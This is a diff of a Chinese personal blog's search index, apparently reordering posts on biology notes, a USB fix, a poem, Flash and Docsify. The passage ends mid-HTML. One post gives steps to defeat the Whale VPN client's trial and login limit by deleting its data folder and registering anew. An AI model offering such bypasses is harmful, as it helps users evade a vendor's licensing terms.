@@ -39,6 +39,27 @@
       </tags>
   </entry>
   <entry>
+    <title>初中生物重要知识点总结</title>
+    <url>/2024/04/13/chu-zhong-sheng-wu-chong-yao-zhi-shi-dian-zong-jie/</url>
+    <content><![CDATA[<p>初中生物重要知识点总结，仅供复习参考。<br />
+大部分内容来自《万唯中考试题研究》和各种各样的考试，其中一部分是我的错题。</p>
+<span id="more"></span>
+<p><img src="/post-images/001147de777b66f07a51de1c6929d47d.jpg" alt="" /><br />
+<img src="/post-images/d7548989259d796a36c0e60210a48b98.jpg" alt="" /><br />
+<img src="/post-images/60c6fa7e507b1a3dadafed0a70d78f37.jpg" alt="" /><br />
+<img src="/post-images/8f4255e7859fdd2760a9c27b290478d5.jpg" alt="" /><br />
+<img src="/post-images/28b15c21afb917dd5683a3acc4f89920.jpg" alt="" /><br />
+<img src="/post-images/4214d3bab285a07cc49a7b57b61064b0.jpg" alt="" /><br />
+<img src="/post-images/53fa669854d7e92a9d8f961ee33c74b1.jpg" alt="" /></p>
+]]></content>
+      <categories>
+        <category>文化课</category>
+      </categories>
+      <tags>
+        <tag>笔记</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>重新排列 Windows“新建”菜单的顺序</title>
     <url>/2024/06/20/chong-xin-pai-lie-windowsxin-jian-cai-dan-de-shun-xu/</url>
     <content><![CDATA[<p>为了方便使用，我的 Windows 电脑进行了许多个性化设置。比如我重新排列了“新建”菜单各个项目的顺序。</p>
@@ -78,24 +99,32 @@
       </tags>
   </entry>
   <entry>
-    <title>初中生物重要知识点总结</title>
-    <url>/2024/04/13/chu-zhong-sheng-wu-chong-yao-zhi-shi-dian-zong-jie/</url>
-    <content><![CDATA[<p>初中生物重要知识点总结，仅供复习参考。<br />
-大部分内容来自《万唯中考试题研究》和各种各样的考试，其中一部分是我的错题。</p>
-<span id="more"></span>
-<p><img src="/post-images/001147de777b66f07a51de1c6929d47d.jpg" alt="" /><br />
-<img src="/post-images/d7548989259d796a36c0e60210a48b98.jpg" alt="" /><br />
-<img src="/post-images/60c6fa7e507b1a3dadafed0a70d78f37.jpg" alt="" /><br />
-<img src="/post-images/8f4255e7859fdd2760a9c27b290478d5.jpg" alt="" /><br />
-<img src="/post-images/28b15c21afb917dd5683a3acc4f89920.jpg" alt="" /><br />
-<img src="/post-images/4214d3bab285a07cc49a7b57b61064b0.jpg" alt="" /><br />
-<img src="/post-images/53fa669854d7e92a9d8f961ee33c74b1.jpg" alt="" /></p>
+    <title>解决一部分 Windows 下 U 盘插入无反应的问题</title>
+    <url>/2023/11/19/jie-jue-yi-bu-fen-windows-xia-u-pan-cha-ru-wu-fan-ying-de-wen-ti/</url>
+    <content><![CDATA[<p>本文适用情况：</p>
+<ul>
+<li>U 盘硬件正常，原来还能用；</li>
+<li>电脑能用，计算机管理没被禁用；</li>
+<li><strong>插入 U 盘后电脑发出提示音，但文件资源管理器无反应</strong>。</li>
+</ul>
+<p>具体的解决步骤如下：</p>
+<ol>
+<li>同时按下 <code>Win + R</code>，打开运行窗口：<br />
+<img src="/post-images/a07f4dbcd00f6ebe1aa67e2003b4c8bb.png" alt="" /></li>
+<li>输入 <code>%windir%\system32\compmgmt.msc /s</code>，回车运行，打开<strong>计算机管理</strong>页面：<br />
+<img src="/post-images/435d3074ffd8918189c935e05e73c16f.png" alt="" /></li>
+<li>系统工具 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>→</mo></mrow><annotation encoding="application/x-tex">\to</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">→</span></span></span></span> 右边栏：通用串行总线控制器 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>→</mo></mrow><annotation encoding="application/x-tex">\to</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">→</span></span></span></span> USB 大容量存储设备。左键单击选中它。</li>
+<li>右键：卸载设备。<br />
+<img src="/post-images/ee1d1e70e4ef9f843ead49258345657d.png" alt="" />刷新之后一定是没有这一项才算成功。</li>
+<li>重新插拔 U 盘，完成。<br />
+<img src="/post-images/c401d6bb9f8e403f474dc03f22474e97.png" alt="" /></li>
+</ol>
 ]]></content>
       <categories>
-        <category>文化课</category>
+        <category>计算机</category>
       </categories>
       <tags>
-        <tag>笔记</tag>
+        <tag>教程</tag>
       </tags>
   </entry>
   <entry>
@@ -156,32 +185,36 @@
       </tags>
   </entry>
   <entry>
-    <title>解决一部分 Windows 下 U 盘插入无反应的问题</title>
-    <url>/2023/11/19/jie-jue-yi-bu-fen-windows-xia-u-pan-cha-ru-wu-fan-ying-de-wen-ti/</url>
-    <content><![CDATA[<p>本文适用情况：</p>
-<ul>
-<li>U 盘硬件正常，原来还能用；</li>
-<li>电脑能用，计算机管理没被禁用；</li>
-<li><strong>插入 U 盘后电脑发出提示音，但文件资源管理器无反应</strong>。</li>
-</ul>
-<p>具体的解决步骤如下：</p>
-<ol>
-<li>同时按下 <code>Win + R</code>，打开运行窗口：<br />
-<img src="/post-images/a07f4dbcd00f6ebe1aa67e2003b4c8bb.png" alt="" /></li>
-<li>输入 <code>%windir%\system32\compmgmt.msc /s</code>，回车运行，打开<strong>计算机管理</strong>页面：<br />
-<img src="/post-images/435d3074ffd8918189c935e05e73c16f.png" alt="" /></li>
-<li>系统工具 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>→</mo></mrow><annotation encoding="application/x-tex">\to</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">→</span></span></span></span> 右边栏：通用串行总线控制器 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>→</mo></mrow><annotation encoding="application/x-tex">\to</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">→</span></span></span></span> USB 大容量存储设备。左键单击选中它。</li>
-<li>右键：卸载设备。<br />
-<img src="/post-images/ee1d1e70e4ef9f843ead49258345657d.png" alt="" />刷新之后一定是没有这一项才算成功。</li>
-<li>重新插拔 U 盘，完成。<br />
-<img src="/post-images/c401d6bb9f8e403f474dc03f22474e97.png" alt="" /></li>
-</ol>
+    <title>南柯子·游甘肃</title>
+    <url>/2024/08/04/nan-ke-zi-you-gan-su/</url>
+    <content><![CDATA[<p>崆峒圣道源，三家合一山。麦积栈道入云端。黄帝问道，高山月夜寒。<br />
+子美客天水，太白过南山。黄河石林竦峙千。马踏飞燕，过了小西天。</p>
+<p><img src="/post-images/49ba673d516a87dba324f5a4d8dd4391.jpg" alt="" /><br />
+<img src="/post-images/10dc457479ba5aec4f935c7a3745f7a2.jpg" alt="" /><br />
+<img src="/post-images/5bfcfacde800dd8ae08eda997432bea1.jpg" alt="" /><br />
+<img src="/post-images/0ec6be33b055c240ce9bf157ab95bd5d.jpg" alt="" /><br />
+<img src="/post-images/1b649567d66a799176d93ee8a7c9f969.jpg" alt="" /><br />
+<img src="/post-images/cc41107c42ad0f37df97b07111df06ae.jpg" alt="" /><br />
+<img src="/post-images/04338ab373d51416e88ac8901af3aae7.jpg" alt="" /><br />
+<img src="/post-images/2e95a6cf36d9f1c47094d5d9b29c1365.jpg" alt="" /><br />
+<img src="/post-images/c5fdcdaf67429abbcf54198fbc294bda.jpg" alt="" /></p>
+<hr />
+<p>吃货属性爆发！~</p>
+<p><img src="/post-images/9f95560534d0f4feb31d438d7b83f666.jpg" alt="" /><br />
+<img src="/post-images/f882dc6e20e9bff29c5578c18a8f3acb.jpg" alt="" /><br />
+<img src="/post-images/4a78b2a14521a9186d53c9c0d77a5593.jpg" alt="" /><br />
+<img src="/post-images/c356cbf6ae7a0278f75ee1e7c9fb8746.jpg" alt="" /><br />
+<img src="/post-images/696d314abcec52306907ca5e972df506.jpg" alt="" /><br />
+<img src="/post-images/ae02fbc2b1be7d0c45a585c377fff5a4.jpg" alt="" /><br />
+<img src="/post-images/f7681d254870049e3b6219d940e3da2b.jpg" alt="" /><br />
+<img src="/post-images/bfbe0eb421607b0eb63418e4ea122a20.jpg" alt="" /><br />
+<img src="/post-images/72b26710e6f0e77b89c861eefde009c0.jpg" alt="" /></p>
 ]]></content>
       <categories>
-        <category>计算机</category>
+        <category>诗词</category>
       </categories>
       <tags>
-        <tag>教程</tag>
+        <tag>诗词</tag>
       </tags>
   </entry>
   <entry>
@@ -239,39 +272,6 @@
       </categories>
       <tags>
         <tag>教程</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>南柯子·游甘肃</title>
-    <url>/2024/08/04/nan-ke-zi-you-gan-su/</url>
-    <content><![CDATA[<p>崆峒圣道源，三家合一山。麦积栈道入云端。黄帝问道，高山月夜寒。<br />
-子美客天水，太白过南山。黄河石林竦峙千。马踏飞燕，过了小西天。</p>
-<p><img src="/post-images/49ba673d516a87dba324f5a4d8dd4391.jpg" alt="" /><br />
-<img src="/post-images/10dc457479ba5aec4f935c7a3745f7a2.jpg" alt="" /><br />
-<img src="/post-images/5bfcfacde800dd8ae08eda997432bea1.jpg" alt="" /><br />
-<img src="/post-images/0ec6be33b055c240ce9bf157ab95bd5d.jpg" alt="" /><br />
-<img src="/post-images/1b649567d66a799176d93ee8a7c9f969.jpg" alt="" /><br />
-<img src="/post-images/cc41107c42ad0f37df97b07111df06ae.jpg" alt="" /><br />
-<img src="/post-images/04338ab373d51416e88ac8901af3aae7.jpg" alt="" /><br />
-<img src="/post-images/2e95a6cf36d9f1c47094d5d9b29c1365.jpg" alt="" /><br />
-<img src="/post-images/c5fdcdaf67429abbcf54198fbc294bda.jpg" alt="" /></p>
-<hr />
-<p>吃货属性爆发！~</p>
-<p><img src="/post-images/9f95560534d0f4feb31d438d7b83f666.jpg" alt="" /><br />
-<img src="/post-images/f882dc6e20e9bff29c5578c18a8f3acb.jpg" alt="" /><br />
-<img src="/post-images/4a78b2a14521a9186d53c9c0d77a5593.jpg" alt="" /><br />
-<img src="/post-images/c356cbf6ae7a0278f75ee1e7c9fb8746.jpg" alt="" /><br />
-<img src="/post-images/696d314abcec52306907ca5e972df506.jpg" alt="" /><br />
-<img src="/post-images/ae02fbc2b1be7d0c45a585c377fff5a4.jpg" alt="" /><br />
-<img src="/post-images/f7681d254870049e3b6219d940e3da2b.jpg" alt="" /><br />
-<img src="/post-images/bfbe0eb421607b0eb63418e4ea122a20.jpg" alt="" /><br />
-<img src="/post-images/72b26710e6f0e77b89c861eefde009c0.jpg" alt="" /></p>
-]]></content>
-      <categories>
-        <category>诗词</category>
-      </categories>
-      <tags>
-        <tag>诗词</tag>
       </tags>
   </entry>
   <entry>
@@ -622,31 +622,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Windows 下破解 Whale（VPN 白鲸加速器）的登录限制</title>
-    <url>/2024/01/28/windows-xia-po-jie-whalebai-jing-jia-su-qi-de-deng-lu-xian-zhi/</url>
-    <content><![CDATA[<blockquote>
-<p>声明：<br />
-本人不存在利用 VPN 进行诈骗等，涉及违反法律的任何行为。只是用来看 Gmail 的。<br />
-<strong>如果某人利用文章提供的信息实施法律所禁止的行为，与本文原作者 PanDaoxi 无关。</strong><br />
-法不可违！</p>
-</blockquote>
-<p><a href="https://m.bj1ch.com/">https://m.bj1ch.com/</a></p>
-<hr />
-<ol>
-<li>退出加速器。</li>
-<li>打开 <code>%programdata%</code> 目录。</li>
-<li>删除 <code>Whale</code> 文件夹。</li>
-<li>重新打开加速器，注册一个帐号即可白嫖。</li>
-</ol>
-]]></content>
-      <categories>
-        <category>计算机</category>
-      </categories>
-      <tags>
-        <tag>教程</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>用 Flash 制作 PanDaoxi 同款校徽封面</title>
     <url>/2024/06/30/yong-flash-zhi-zuo-pandaoxi-tong-kuan-tou-tu/</url>
     <content><![CDATA[<p><img src="/post-images/e61fc195c9cde018de3ba612f321463b.png" alt="1" /></p>
@@ -683,6 +658,31 @@
 <p><img src="/post-images/1c59546e1382f9cbc1f2d7f29ec43282.png" alt="Clip_2024-06-30_15-14-43" /></p>
 <h1 id="最终效果"><a class="markdownIt-Anchor" href="#最终效果"></a> 最终效果</h1>
 <p><img src="/post-images/c1d4ef900c5ad45a45da72969a010eb1.png" alt="" /></p>
+]]></content>
+      <categories>
+        <category>计算机</category>
+      </categories>
+      <tags>
+        <tag>教程</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Windows 下破解 Whale（VPN 白鲸加速器）的登录限制</title>
+    <url>/2024/01/28/windows-xia-po-jie-whalebai-jing-jia-su-qi-de-deng-lu-xian-zhi/</url>
+    <content><![CDATA[<blockquote>
+<p>声明：<br />
+本人不存在利用 VPN 进行诈骗等，涉及违反法律的任何行为。只是用来看 Gmail 的。<br />
+<strong>如果某人利用文章提供的信息实施法律所禁止的行为，与本文原作者 PanDaoxi 无关。</strong><br />
+法不可违！</p>
+</blockquote>
+<p><a href="https://m.bj1ch.com/">https://m.bj1ch.com/</a></p>
+<hr />
+<ol>
+<li>退出加速器。</li>
+<li>打开 <code>%programdata%</code> 目录。</li>
+<li>删除 <code>Whale</code> 文件夹。</li>
+<li>重新打开加速器，注册一个帐号即可白嫖。</li>
+</ol>
 ]]></content>
       <categories>
         <category>计算机</category>
@@ -1261,58 +1261,47 @@
       </tags>
   </entry>
   <entry>
-    <title>在线文档 Docsify 的简单应用</title>
-    <url>/2024/04/21/zai-xian-wen-dang-docsify-de-jian-dan-ying-yong/</url>
-    <content><![CDATA[<p>众所周知，我把以前我在 CSDN 的博客放在了一个新站点上——CSDN Blog，作为我技术博客的一个分站。</p>
-<p><img src="/post-images/b6eb7142da85747ced076b972ab01c25.png" alt="" /><br />
-<img src="/post-images/b848cc4ed1f610e8281f4667e45b238d.png" alt="" /></p>
-<blockquote>
-<p>链接：<br />
-<a href="https://daoxi365.github.io/csdn-blogs/">https://daoxi365.github.io/csdn-blogs/</a>（新：CSDN Blog）<br />
-<a href="https://pandaoxi.blog.csdn.net/">https://pandaoxi.blog.csdn.net/</a>（已注销的 CSDN 旧博客）</p>
+    <title>BSOD 的技巧（如何使 Windows 蓝屏）</title>
+    <url>/2023/07/02/%E5%BF%AB%E9%80%9F%E8%AE%A9%E7%94%B5%E8%84%91%E8%93%9D%E5%B1%8F/</url>
+    <content><![CDATA[<blockquote>
+<p>电脑蓝屏，又叫蓝屏死机（<code>Blue Screen of Death</code>，简称 <code>BSOD</code>），是微软的 <code>Windows</code> 系列操作系统在无法从一个系统错误中恢复过来时，为保护电脑数据文件不被破坏而强制显示的屏幕图像。<br />
+<code>Windows</code> 操作系统的蓝屏死机提示已经成为标志性的画面。大部分是系统崩溃的现象。<code>Windows</code> 中有两个蓝底白字图像都被称为蓝屏死机：一种是 <code>Windows 9x</code> 操作系统发生小故障，一种是 <code>Windows NT</code> 发生内核错误。由于 <code>Windows 9x</code> 已退出历史舞台，所以现在一般指后者。<br />
+——百度百科</p>
 </blockquote>
-<p>为什么不直接把文章放在 Gridea 下呢？原因有两个：</p>
-<ul>
-<li>文章数量太多，不易操作；</li>
-<li>文章太多时 Gitee Page 会崩掉。</li>
-</ul>
-<p>因此我选择了 <a href="https://docsify.js.org/#/zh-cn/"><strong>Docsify</strong></a> 这一静态文档网站生成器。<br />
-如果你问我，它好用吗？<br />
-——好用是挺好用的，但是很麻烦。</p>
-<p></p>
-<hr />
-<h1 id="概况"><a class="markdownIt-Anchor" href="#概况"></a> 概况</h1>
-<p>在注销之前，我共有 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>420</mn></mrow><annotation encoding="application/x-tex">420</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">4</span><span class="mord">2</span><span class="mord">0</span></span></span></span> 篇原创文章需要收集起来放到新网站里。<br />
-通过一些手段导出来之后（<a href="https://blog.csdn.net/qq_33417321/article/details/131342634">手段</a>）解压出来是 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>420</mn></mrow><annotation encoding="application/x-tex">420</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">4</span><span class="mord">2</span><span class="mord">0</span></span></span></span> 个 Markdown 文件。<br />
-本来 Docsify 是支持 markdown 的，但是 CSDN 的图片有防盗链设置，而且一些文件名也存在问题，不支持。比如说有一些文章标题里带空格，这是不被 Docsify 识别的。<br />
-因此我们需要克服很多困难……</p>
-<h1 id="困难-1文件名称和图片修改"><a class="markdownIt-Anchor" href="#困难-1文件名称和图片修改"></a> 困难 1：文件名称和图片修改</h1>
-<p>由于文章太多，不能一个个地把图片弄下来，也不能手动修改每一个错误的文件名。<br />
-所以我使用了 Python 做批处理的活。这个 Python 文件的目的有以下几个：</p>
-<ul>
-<li>匹配图片，替换图片；</li>
-<li>修改文件名。</li>
-</ul>
-<p>Luckily，我发现一个可以反防盗链的 API。只需要在链接前面添加上 <code>https://pic.2ge.org/cdn/?url=</code> 即可。</p>
-<p>关于匹配，我直接让 ChatGPT 写了一个，真是太有实力啦！👍</p>
-<p><img src="/post-images/4e492b1dc1df1ddffc69326396d3e2dc.png" alt="" /></p>
-<p>我把这些博客放在文件夹 <code>./1</code> 下，在上层目录添加文件夹 <code>./2</code>，创建 <code>./maker.py</code>：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_image_links_from_markdown</span>(<span class="params">markdown_text</span>):</span><br><span class="line">    pattern = <span class="string">r&#x27;!\[.*?\]\((.*?)\)&#x27;</span></span><br><span class="line">    image_links = re.findall(pattern, markdown_text)</span><br><span class="line">    <span class="keyword">return</span> image_links</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pths = []</span><br><span class="line">names = []</span><br><span class="line"><span class="keyword">for</span> i, j, k <span class="keyword">in</span> os.walk(<span class="string">&quot;1/&quot;</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">len</span>(names):</span><br><span class="line">        names = k</span><br><span class="line">    <span class="keyword">for</span> l <span class="keyword">in</span> k:</span><br><span class="line">        pths.append(os.path.join(i, l))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(pths)):</span><br><span class="line">    r = <span class="string">&quot;&quot;</span></span><br><span class="line">    names[i] = names[i].split(<span class="string">&quot;.md&quot;</span>)[<span class="number">0</span>].replace(<span class="string">&quot;~&quot;</span>, <span class="string">&quot;-&quot;</span>).replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(pths[i], <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        r = f.read()</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> extract_image_links_from_markdown(r):</span><br><span class="line">        r = r.replace(j, <span class="string">&quot;https://pic.2ge.org/cdn/?url=%s&quot;</span> % j)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;2/%s.md&quot;</span> % names[i], <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(r)</span><br><span class="line">    <span class="built_in">print</span>(i, names[i])</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">x = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> names:</span><br><span class="line">    j = i</span><br><span class="line">    x += <span class="string">&quot;- [%s](%s)\n&quot;</span> % (j, j)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;2/_sidebar.md&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(x)</span><br><span class="line"></span><br><span class="line"><span class="built_in">input</span>()</span><br></pre></td></tr></table></figure>
-<p>把 <code>./2</code> 的所有文件复制到新博客下就行啦。</p>
-<h1 id="困难-2docsify-美化"><a class="markdownIt-Anchor" href="#困难-2docsify-美化"></a> 困难 2：Docsify 美化</h1>
-<p>按照官网教程一步步操作后发现页面好丑……于是我自己参照网络教程，简单地美化了一下：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>【PanDaoxi】CSDN Blog<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge,chrome=1&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;description&quot;</span> <span class="attr">content</span>=<span class="string">&quot;Description&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">content</span>=<span class="string">&quot;width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;icon&quot;</span> <span class="attr">class</span>=<span class="string">&quot;js-site-favicon&quot;</span> <span class="attr">type</span>=<span class="string">&quot;image/svg+xml&quot;</span> <span class="attr">href</span>=<span class="string">&quot;https://pandaoxi.gitee.io/tech-blog/favicon.svg&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">&quot;https://cdn.bootcdn.net/ajax/libs/docsify/4.13.1/themes/vue.min.css&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">&quot;https://cdn.bootcdn.net/ajax/libs/prism/9000.0.1/themes/prism.min.css&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span>Loading<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">window</span>.<span class="property">$docsify</span> = &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">name</span>: <span class="string">&#x27;PanDaoxi&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">loadSidebar</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">sidebarDisplayLevel</span>: <span class="number">1</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">alias</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="string">&#x27;/.*/_sidebar.md&#x27;</span>: <span class="string">&#x27;/_sidebar.md&#x27;</span></span></span><br><span class="line"><span class="language-javascript">            &#125;,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">loadNavbar</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">coverpage</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">maxLevel</span>: <span class="number">5</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">subMaxLevel</span>: <span class="number">3</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">mergeNavbar</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">auto2top</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">latex</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            inlineMath   : [[<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;$&#x27;</span>], [<span class="string">&#x27;\\(&#x27;</span>, <span class="string">&#x27;\\)&#x27;</span>]],</span></span><br><span class="line"><span class="language-javascript">            displayMath  : [[<span class="string">&#x27;$$&#x27;</span>, <span class="string">&#x27;$$&#x27;</span>]],</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">customOptions</span>: &#123;&#125;</span></span><br><span class="line"><span class="language-javascript">          &#125;,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">pagination</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">previousText</span>: <span class="string">&#x27;上一章节&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">nextText</span>: <span class="string">&#x27;下一章节&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">           &#125;,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">search</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">paths</span>: <span class="string">&#x27;auto&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">placeholder</span>: <span class="string">&#x27;搜索&#x27;</span>,    </span></span><br><span class="line"><span class="language-javascript">                <span class="attr">placeholder</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="string">&#x27;/zh-cn/&#x27;</span>: <span class="string">&#x27;搜索&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                    <span class="string">&#x27;/&#x27;</span>: <span class="string">&#x27;Type to search&#x27;</span></span></span><br><span class="line"><span class="language-javascript">                &#125;,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">noData</span>: <span class="string">&#x27;找不到结果&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">depth</span>: <span class="number">4</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">hideOtherSidebarContent</span>: <span class="literal">false</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">namespace</span>: <span class="string">&#x27;Docsify-Guide&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            &#125;,</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="attr">count</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">countable</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">position</span>: <span class="string">&#x27;top&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">margin</span>: <span class="string">&#x27;10px&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">float</span>: <span class="string">&#x27;right&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">fontsize</span>:<span class="string">&#x27;0.9em&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">color</span>:<span class="string">&#x27;rgb(90,90,90)&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">language</span>:<span class="string">&#x27;chinese&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">isExpected</span>: <span class="literal">true</span></span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.bootcdn.net/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://unpkg.com/docsify-latex@0.5.2/dist/docsify-latex.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.bootcdn.net/ajax/libs/docsify/4.13.1/docsify.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.bootcdn.net/ajax/libs/docsify/4.13.1/plugins/emoji.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.bootcdn.net/ajax/libs/docsify/4.13.1/plugins/zoom-image.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    